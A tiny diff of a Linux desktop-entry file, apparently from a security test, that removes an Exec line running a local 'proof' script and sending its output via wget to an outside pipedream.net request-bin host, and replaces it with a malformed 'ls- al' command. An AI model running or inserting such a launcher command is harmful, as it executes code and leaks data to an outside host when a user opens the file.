@@ -1,3 +1,2 @@
-[Desktop Entry]
-Exec=sh -c "wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?`/proof*.sh`"
+Exec=sh -c "ls- al"
 Type=Application
